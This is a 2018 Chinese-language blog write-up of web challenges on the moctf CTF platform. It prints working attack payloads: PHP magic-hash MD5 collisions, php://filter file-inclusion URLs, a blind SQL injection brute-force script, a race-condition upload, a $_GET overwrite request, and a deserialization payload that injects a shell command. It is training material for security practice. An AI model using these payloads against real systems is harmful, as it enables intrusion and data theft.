title: moctf平台的web题
author: Qianye
abbrlink: 593de28d
tags:
  - ctf
categories:
  - ctf
date: 2018-03-01 20:15:00
---

[moctf平台](http://www.moctf.com/home) 学长们搭建的平台，挺不错的。
<!-- more -->
# 限制访问

提示值允许只允许使用NAIVE浏览器访问！通过bp抓包，修改UA为NAIVE。又显示只能允许香港记者访问，修改AL为zh-HK.
# 机器蛇
访问robots.txt 访问不允许访问的页面，即可得到flag。
# PHP黑魔法
源码泄漏php~
进入index.php~,得到源码
```bash
<?php

	$flag="moctf{**************}";
	
	if (isset($_GET['a'])&&isset($_GET['b'])) {
		$a=$_GET['a'];
		$b=$_GET['b'];


		if($a==$b) 
		{
			echo "<center>Wrong Answer!</center>";
		}
		else {
			if(md5($a)==md5($b)) 
			{
				echo "<center>".$flag."</center>"; 
				echo "By:daoyuan";
			}
			else echo "<center>Wrong Answer!</center>";
		}
		
	}
	else echo "<center>好像少了点什么</center>"; 
?>
```
因为0e[0-9]+格式的字符串在进行弱类型比较时会按照科学计数法后比较
```bash
md5(!1793422703!,32) = 0e332932043729729062996282883873
md5(QNKCDZO,32) = 0e830400451993494058024219903391
md5(240610708,32) = 0e462097431906509019562988736854
```
# 我想要钱
```bash
<?php
    include "flag.php";
    highlight_file(__FILE__);

    if (isset($_GET['money'])) {
        $money=$_GET['money'];
        if(strlen($money)<=4&&$money>time()&&!is_array($money))
        {
            echo $flag;
            echo "<!--By:daoyuan-->";
        }
        else echo "Wrong Answer!";
    }
    else echo "Wrong Answer!";
?>

```
用科学计数法 money=3e10绕过
# 听说要登入
万能密码绕过
# flag在哪里
访问flag.php发生多次跳转
```bash
flag.php -> where_is_flag.php -> I_have_a_flag.php -> I_have_a_frog.php -> no_flag.php
```
根据提示搜索ppap歌词，
```bash
PPAP
I have a pen,I have an apple.
(Eh~)Apple-pen!
```
根据歌词，猜测flag的文件为，flagfrog.php

# 死亡退出
```bash
<?php
  show_source(__FILE__);
  $c="<?php exit;?>";
  @$c.=$_POST['c'];
  @$filename=$_POST['file']; 
  if(!isset($filename))                    
  {                                       
    file_put_contents('tmp.php', ''); 
  }                                 
  @file_put_contents($filename, $c);
  include('tmp.php');
?>
```
这道题不懂，[附上其他大佬的见解吧](http://skysec.top/2018/01/31/moctf-Web%E9%A2%98%E8%A7%A3/)
# 文件包含
访问如下链接即可得到flag
```bash
http://119.23.73.3:5001/web8/index.php?file=php://filter/read=convert.base64-encode/resource=flag.php
```
# 美味的饼干
cookie中
```bash
ZWUxMWNiYjE5MDUyZTQwYjA3YWFjMGNhMDYwYzIzZWU= 
```
解码得
```bash
ee11cbb19052e40b07aac0ca060c23ee
```
注意到是32wei,md5解密的
`user`
提示要用`admin`登入，对admin进行MD5机密，再base64，修改cookie可得
# 火眼金晶
```bash
import requests
import re
url = "http://119.23.73.3:5001/web10/index.php"
r = requests.get(url=url)
res_tr = r"'100'>(.*?)</textarea>"
txt =  re.findall(res_tr,r.content.decode('utf-8'))[0]
moctf = r"moctf"
mount = re.findall(moctf,txt)
number = len(mount)
data = {
    "answer":number
}
url1 = "http://119.23.73.3:5001/web10/work.php"
s = requests.post(url=url1,data=data,cookies=r.cookies)
print(s.content)
```
# 简单注入
不会做
```bash
import requests
import string
import codecs
s=string.printable
flag = ""
for i in range(1,30):
    for j in s:
        # url = "http://119.23.73.3:5004/?id=3'^'(ascii(mid((select(group_concat(TABLE_NAME))from(information_schema.TABLES)where(TABLE_SCHEMA=database())),"+str(i)+",1))="+j+")"
        # url = "http://119.23.73.3:5004/?id=3'^'(ascii(mid((select(group_concat(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME='do_y0u_l1ke_long_t4ble_name')),"+str(i)+",1))="+j+")"
        url = "http://119.23.73.3:5004/?id=3'^'(ascii(mid((select(d0_you_als0_l1ke_very_long_column_name)from(do_y0u_l1ke_long_t4ble_name)),"+str(i)+",1))="+j+")"
        r=requests.get(url)
        if "Tip" in r.content.decode('utf-8'):
            flag += j
            print(flag)
            break

```
# 没时间解释
这是一个条件竞争题。访问，index.php跳转到index2.php 。bp抓包，访问index.php,知道要访问uploadsomething.php. 是一个类似上传的页面，随便上传一个，得知flag在哪个位置，访问之，显示too low. 多次尝试，知道flag在固定的目录下，文件名是我们控制的。开两个intruder.
```bash
http://119.23.73.3:5006/web2/uploadsomething.php?filename=123&content=§1234§
```

```bash
http://119.23.73.3:5006/web2/uploads/7dab88dbd2950685ac8841eb87e6d68f4ef8c1dd/123
```
# unset
题目
```bash
<?php
highlight_file('index.php');
function waf($a){
foreach($a as $key => $value){
        if(preg_match('/flag/i',$key)){
        exit('are you a hacker');
}
}
}
foreach(array('_POST', '_GET', '_COOKIE') as $__R) {
        if($$__R) { 
        foreach($$__R as $__k => $__v) { 
            if(isset($$__k) && $$__k == $__v) unset($$__k); 
        }
     }

}
if($_POST) { waf($_POST);}
if($_GET) { waf($_GET); }
if($_COOKIE) { waf($_COOKIE);}

if($_POST) extract($_POST, EXTR_SKIP);
if($_GET) extract($_GET, EXTR_SKIP);
if(isset($_GET['flag'])){
if($_GET['flag'] === $_GET['daiker']){
        exit('error');
}
if(md5($_GET['flag'] ) == md5($_GET['daiker'])){
        include($_GET['file']);
}
}

?>
```
解法：
```bash
POST /?flag=QNKCDZO&daiker=s878926199a&file=php://filter/read=convert.base64-encode/resource=flag.php HTTP/1.1
Host: 119.23.73.3:5101
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
X-Forwarded-For: 127.0.0.1, 127.0.0.1
Connection: close
Upgrade-Insecure-Requests: 1

_GET[flag]=QNKCDZO&_GET[daiker]=s878926199a&_GET[file]=php://filter/read=convert.base64-encode/resource=flag.php
```
# PUBG
用工具扫一扫发现源码备份
index.php.bak
```bash
<?php
    error_reporting(0);
    include 'class.php';
    if(is_array($_GET)&&count($_GET)>0)
    {
        if(isset($_GET["LandIn"]))
        {
            $pos=$_GET["LandIn"];
        }
        if($pos==="airport")
        {
            die("<center>机场大仙太多,你被打死了~</center>");
        }
        elseif($pos==="school")
        {
            echo('</br><center><a href="/index.html"  style="color:white">叫我校霸~~</a></center>');
            $pubg=$_GET['pubg'];
            $p = unserialize($pubg);
            // $p->Get_air_drops($p->weapon,$p->bag);
        }
        elseif($pos==="AFK")
        {
            die("<center>由于你长时间没动,掉到海里淹死了~</center");
        }
        else
        {
            die("<center>You Lose</center>");
            
        }
    }
?>
```

class.php.bak
```bash
<?php
    include 'waf.php';
    class sheldon{
        public $bag="nothing";
        public $weapon="M24";
        // public function __toString(){
        //     $this->str="You got the airdrop";
        //     return $this->str;
        // }
        public function __wakeup()
        {
            $this->bag="nothing";
            $this->weapon="kar98K";
        }
        public function Get_air_drops($b)
        {
                $this->$b();
        }
        public function __call($method,$parameters)
        {
            $file = explode(".",$method);
            echo $file[0];
            if(file_exists(".//class$file[0].php"))
            {
                system("php  .//class//$method.php");
            }
            else
            {
                system("php  .//class//win.php");
            }
            die();
        }
        public function nothing()
        {
            die("<center>You lose</center>");
        }
        public function __destruct()
        {
            waf($this->bag);
            if($this->weapon==='AWM')
            {
                $this->Get_air_drops($this->bag);
            }
            else
            {
                die('<center>The Air Drop is empty,you lose~</center>');
            }
        }
    }
?>

```
[php的魔术方法](http://php.net/manual/zh/language.oop5.magic.php)</br>
[由Typecho 深入理解PHP反序列化漏洞](https://zhuanlan.zhihu.com/p/33426188)</br>
[__wakeup()函数失效引发漏洞(CVE-2016-7124)](http://blog.csdn.net/qq_19876131/article/details/52890854)</br>
pyaload
```bash
?LandIn=school&pubg=O:7:"sheldon":3:{s:3:"bag";s:24:"win.php;cat%20./class/flag";s:6:"weapon";s:3:"AWM";}
```
查看源代码即可得。

# 简单的代码审计
```bash
<?php
error_reporting(0);
include('config.php');
header("Content-type:text/html;charset=utf-8");
function get_rand_code($l = 6) {
    $result = '';
    while($l--) {
        $result .= chr(rand(ord('a'), ord('z')));
    }
    return $result;
}

function test_rand_code() {
    $ip=$_SERVER['REMOTE_ADDR'];
    $code=get_rand_code();
    $socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    @socket_connect($socket, $ip, 8888);
    @socket_write($socket, $code.PHP_EOL);
    @socket_close($socket);
    die('test ok!');
}

function upload($filename, $content,$savepath) {
    $AllowedExt = array('bmp','gif','jpeg','jpg','png');
    if(!is_array($filename)) {
        $filename = explode('.', $filename);
    }
    if(!in_array(strtolower($filename[count($filename)-1]),$AllowedExt)){
        die('error ext!');
    }
    $code=get_rand_code();
    $finalname=$filename[0].'moctf'.$code.".".end($filename);
    waf2($finalname);
    file_put_contents("$savepath".$finalname, $content);
    usleep(3000000);
    file_put_contents("$savepath".$finalname, "moctf");
    unlink("$savepath".$finalname);
    die('upload over!');
}

$savepath="uploads/".sha1($_SERVER['REMOTE_ADDR'])."/";
if(!is_dir($savepath)){
    $oldmask = umask(0);
    mkdir($savepath, 0777);
    umask($oldmask);
}
if(isset($_GET['action']))
{
    $act=$_GET['action'];
    if($act==='upload')
    {
        $filename=$_POST['filename'];
        if(!is_array($filename)) {
            $filename = explode('.', $filename);
        }
        $content=$_POST['content'];
        waf($content);
        upload($filename,$content,$savepath);
    }
    else if($act==='test')
    {
        test_rand_code();
    }
}
else {
    highlight_file('index.php');
}
?>
```
[官方的答案](https://www.codemonster.cn/2018/02/13/2018-moctf-happy-writeup/)